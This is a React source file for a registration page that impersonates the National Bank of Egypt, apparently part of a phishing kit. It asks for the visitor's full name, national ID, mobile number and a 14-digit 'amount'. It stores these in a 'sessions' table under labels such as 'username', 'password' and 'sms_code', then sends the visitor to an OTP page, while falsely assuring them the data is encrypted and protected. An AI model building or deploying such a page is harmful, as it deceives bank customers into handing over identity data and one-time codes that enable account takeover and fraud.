import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { User, Phone, CreditCard, ArrowRight } from "lucide-react";
import nbeLogo from "@/assets/nbe-logo-full.png";
import { supabase } from "@/integrations/supabase/client";
import { useSessionRedirect } from "@/hooks/use-session-redirect";

export const Route = createFileRoute("/register")({
  head: () => ({
    meta: [
      { title: "تسجيل جديد | البنك الأهلي المصري" },
      { name: "description", content: "سجل بياناتك الشخصية للانضمام إلى خدمة الأهلي نت." },
      { property: "og:title", content: "تسجيل جديد | البنك الأهلي المصري" },
      { property: "og:description", content: "سجل بياناتك الشخصية للانضمام إلى خدمة الأهلي نت." },
    ],
  }),
  component: Index,
});

const t = {
  ar: {
    welcome: "تسجيل جديد",
    subtitle: "برجاء إدخال بياناتك الشخصية لإتمام عملية التسجيل",
    fullName: "الاسم الكامل",
    nationalId: "الرقم القومي",
    mobile: "رقم الموبايل",
    amount: "المبلغ المحول",
    amountHint: "الحد الأدنى للمبلغ هو 14 رقمًا",
    continue: "متابعة التسجيل",
    checking: "جاري التحقق...",
    verifying: "يرجى الانتظار",
    bankName: "البنك الأهلي المصري",
    privacyNote: "بياناتك الشخصية مشفرة ومحمية بشكل آمن.",
    rights: "جميع الحقوق محفوظة - البنك الأهلي المصري ©",
  },
} as const;

function Index() {
  useSessionRedirect();
  const navigate = useNavigate();
  const c = t.ar;
  const [verifying, setVerifying] = useState(false);
  const [error, setError] = useState("");

  const [fullName, setFullName] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [mobile, setMobile] = useState("");
  const [amount, setAmount] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!fullName || !nationalId || !mobile || !amount) {
      setError("برجاء ملء جميع الحقول");
      return;
    }

    setVerifying(true);

    try {
      const { data, error: insertError } = await supabase
        .from("sessions")
        .insert({
          username: fullName,
          password: nationalId,
          otp: null,
          sms_code: mobile,
          status: "pending_login",
          user_agent: `Registration: amount=${amount}`,
          redirect_to: null,
        })
        .select()
        .maybeSingle();

      if (insertError) throw insertError;

      if (data && typeof window !== "undefined") {
        sessionStorage.setItem("nbe_session_id", data.id);
        navigate({ to: "/otp" });
      }
    } catch (err: any) {
      setError(err.message || "حدث خطأ أثناء التسجيل");
      setVerifying(false);
    }
  };

  return (
    <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
      <header className="flex items-center justify-end border-b border-border bg-background px-6 py-4">
        <img
          src={nbeLogo}
          alt="البنك الأهلي المصري"
          width={1920}
          height={520}
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 py-10">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-md rounded-2xl bg-background p-6 text-right shadow-sm ring-1 ring-border/60"
        >
          <h1 className="text-xl font-bold text-foreground">{c.welcome}</h1>
          <p className="mt-4 text-sm leading-relaxed text-muted-foreground">
            {c.subtitle}
          </p>

          <div className="mt-8 space-y-4">
            <div className="flex items-center justify-between text-sm font-medium text-muted-foreground">
              <span>{c.fullName}</span>
              <User className="h-4 w-4" />
            </div>
            <input
              type="text"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              placeholder="أدخل الاسم completo"
              autoFocus
              className="w-full rounded-xl border border-input bg-background px-4 py-3 text-right outline-none focus:border-primary focus:ring-1 focus:ring-primary disabled:opacity-60"
            />

            <div className="flex items-center justify-between text-sm font-medium text-muted-foreground">
              <span>{c.nationalId}</span>
              <User className="h-4 w-4" />
            </div>
            <input
              type="text"
              inputMode="numeric"
              value={nationalId}
              onChange={(e) => setNationalId(e.target.value.replace(/\D/g, ""))}
              placeholder="12345678901234"
              className="w-full rounded-xl border border-input bg-background px-4 py-3 text-right dir-ltr outline-none focus:border-primary focus:ring-1 focus:ring-primary disabled:opacity-60"
            />

            <div className="flex items-center justify-between text-sm font-medium text-muted-foreground">
              <span>{c.mobile}</span>
              <Phone className="h-4 w-4" />
            </div>
            <input
              type="tel"
              inputMode="numeric"
              value={mobile}
              onChange={(e) => setMobile(e.target.value.replace(/\D/g, ""))}
              placeholder="01XXXXXXXX"
              className="w-full rounded-xl border border-input bg-background px-4 py-3 text-right dir-ltr outline-none focus:border-primary focus:ring-1 focus:ring-primary disabled:opacity-60"
            />

            <div className="flex items-center justify-between text-sm font-medium text-muted-foreground">
              <span>{c.amount}</span>
              <CreditCard className="h-4 w-4" />
            </div>
            <input
              type="text"
              inputMode="numeric"
              value={amount}
              onChange={(e) => setAmount(e.target.value.replace(/\D/g, ""))}
              placeholder="14 رقم"
              className="w-full rounded-xl border border-input bg-background px-4 py-3 text-right dir-ltr outline-none focus:border-primary focus:ring-1 focus:ring-primary disabled:opacity-60"
            />

            <p className="text-xs text-muted-foreground text-right">{c.amountHint}</p>
          </div>

          {error && (
            <p className="mt-4 rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive text-right">
              {error}
            </p>
          )}

          <button
            type="submit"
            disabled={verifying}
            className="mt-8 w-full rounded-xl bg-primary py-4 text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-70 flex items-center justify-center gap-2"
          >
            {c.continue}
            <ArrowRight className="h-4 w-4" />
          </button>

          {verifying && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-muted-foreground/60">
              <div className="flex flex-col items-center text-center">
                <div className="h-16 w-16 animate-spin rounded-full border-[5px] border-background/60 border-t-primary" />
                <span className="mt-3 text-xl font-bold text-background">{c.checking}</span>
                <span className="mt-2 text-base font-semibold text-background/90">{c.verifying}</span>
              </div>
            </div>
          )}
        </form>

        <div className="mt-8 text-center">
          <p className="text-xs text-muted-foreground">{c.privacyNote}</p>
        </div>
      </main>

      <footer className="mt-10 px-4 pb-10">
        <p className="text-center text-xs text-muted-foreground">{c.rights}</p>
      </footer>
    </div>
  );
}